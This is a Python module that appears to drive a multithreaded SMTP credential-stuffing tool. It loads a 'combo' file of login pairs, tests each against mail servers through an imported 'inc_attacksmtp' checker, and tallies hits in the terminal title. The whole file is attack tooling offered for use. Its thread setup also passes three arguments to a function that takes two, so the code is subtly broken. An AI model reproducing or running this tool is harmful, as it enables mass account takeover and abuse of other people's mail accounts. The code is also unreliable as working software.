import sys
import threading
import inc_attacksmtp as sc
from queue import Queue
from time import sleep
from inc_comboloader import comboloader
from inc_etc import clean


targets_total = int(0)
targets_left = int(0)
hits = int(0)
fails = int(0)

checker_queue = Queue()

def checker_thread(default_timeout, default_email):
    '''
    Function for a single thread which performs the main checking process.

    :param float default_timeout: timeout for server connection
    :param str default_email: user's email for test messages (SMTP only)
    :return: None
    '''
    global targets_left
    global hits
    global fails
    while True:
        target = str(checker_queue.get())
        result = False
        try:
            result = sc.smtpchecker(
                float(default_timeout),
                str(default_email),
                str(f'{target}')
            )
        except:
            pass
        if result == True:
            hits += 1
        else:
            fails += 1
        targets_left -= 1
        checker_queue.task_done()
    sleep(3.0)
    return None

def checker(checker_type, default_threads, default_timeout, default_email, combofile):
    '''
    Function to control the import of combos, to start threads etc.

    :param str checker_type: smtp
    :param int default_threads: amount of threads to use
    :param float default_timeout: timeout for server-connections
    :param str default_email: users's email for test-messages (SMTP only)
    :param str combofile: textfile with combos to import
    :return: True (no errors occurred), False (errors occurred)
    '''
    global targets_total
    global targets_left
    combos_available = False
    try:
        print('Step#1: Loading combos from file ...')
        try:
            combos = comboloader(combofile)
        except:
            combos = []
        targets_total = len(combos)
        targets_left = targets_total
        if targets_total > 0:
            combos_available = True
            print(f'Done! Amount of combos loaded: {str(targets_total)}\n\n')
        else:
            print('Done! No combos loaded.\n\n')
        if combos_available == True:
            print(f'Step#2: Starting threads for {checker_type} checker ...')
            for _ in range(default_threads):
                single_thread = threading.Thread(
                    target=checker_thread,
                    args=(str(f'{checker_type}'),default_timeout,default_email),
                    daemon=True
                )
                single_thread.start()
            for target in combos:
                checker_queue.put(target)
            print('Done! Checker started and running - see stats in window title.\n\n')
            while targets_left > 0:
                try:
                    sleep(1.0)
                    titlestats = str(f'LEFT: {str(targets_left)} # HITS: {str(hits)} # FAILS: {str(fails)}')
                    sys.stdout.write('\33]0;' + titlestats + '\a')
                    sys.stdout.flush()
                except:
                    pass
            print('Step#3: Finishing checking ...')
            checker_queue.join()
            print('Done!\n\n')
            sleep(3.0)
        else:
            print('Press [ENTER] and try again, please!')
            input()
        clean()
        return True
    except:
        clean()
        return False
